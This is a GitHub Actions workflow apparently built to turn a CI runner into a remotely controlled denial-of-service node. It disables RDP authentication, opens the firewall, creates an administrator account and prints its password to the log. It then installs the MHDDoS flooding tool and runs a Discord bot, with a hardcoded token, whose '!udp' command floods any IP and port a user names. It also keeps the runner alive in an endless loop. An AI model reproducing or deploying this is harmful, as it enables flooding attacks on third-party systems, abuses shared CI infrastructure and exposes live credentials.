name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-Access" 2>$null
          netsh advfirewall firewall add rule name="RDP-Access" dir=in action=allow protocol=TCP localport=3389
          Restart-Service -Name TermService -Force

      - name: Create RDP User
        run: |
          $password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "RDP" -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP" -ErrorAction SilentlyContinue
          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV

      - name: Get Machine IP
        run: |
          $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -like "Ethernet*" -or $_.InterfaceAlias -like "Wi-Fi*"}).IPAddress | Select-Object -First 1
          if (-not $ip) { $ip = "127.0.0.1" }
          echo "MACHINE_IP=$ip" >> $env:GITHUB_ENV

      - name: Install Python Dependencies
        run: |
          python -m pip install --upgrade pip
          python -m pip install discord.py aiohttp

      - name: Clone MHDDoS
        run: |
          New-Item -ItemType Directory -Path "C:\MHDDoS" -Force
          cd C:\
          git clone https://github.com/MHProDev/MHDDoS.git
          cd MHDDoS
          python -m pip install -r requirements.txt

      - name: Create Discord Bot
        run: |
          $botScript = @'
import discord
from discord.ext import commands
import asyncio
import subprocess
import os
import sys

TOKEN = "MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk"
MHDDOS_PATH = "C:\\MHDDoS"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

active_attacks = []

@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user}')
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                await channel.send(f'✅ Bot is online!')
                break

@bot.command()
async def udp(ctx, ip: str, port: int, duration: int):
    if not (1 <= port <= 65535):
        await ctx.send('❌ Port must be 1-65535')
        return
    if not (1 <= duration <= 300):
        await ctx.send('❌ Duration must be 1-300 seconds')
        return
    
    cmd = f'python start.py udp {ip}:{port} 10000 {duration}'
    
    await ctx.send(f'✅ Attack started!\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s')
    
    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            cwd=MHDDOS_PATH,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        active_attacks.append(process)
        await process.wait()
        if process in active_attacks:
            active_attacks.remove(process)
        await ctx.send('✅ Attack completed!')
    except Exception as e:
        await ctx.send(f'❌ Error: {str(e)}')

@bot.command()
async def stop(ctx):
    if not active_attacks:
        await ctx.send('❌ No active attacks')
        return
    
    count = 0
    for proc in active_attacks:
        try:
            proc.terminate()
            count += 1
        except:
            pass
    active_attacks.clear()
    await ctx.send(f'✅ Stopped {count} attacks')

try:
    bot.run(TOKEN)
except Exception as e:
    print(f'Bot error: {e}')
    sys.exit(1)
'@
          
          $botScript | Out-File -FilePath "C:\discord_bot.py" -Encoding UTF8

      - name: Start Discord Bot
        run: |
          Start-Process python -ArgumentList "C:\discord_bot.py" -NoNewWindow

      - name: Display RDP Info
        run: |
          Write-Host "`n========== RDP ACCESS =========="
          Write-Host "IP: $env:MACHINE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $env:RDP_PASSWORD"
          Write-Host "================================`n"
          
          while ($true) {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RDP is active..."
            Start-Sleep -Seconds 300
          }
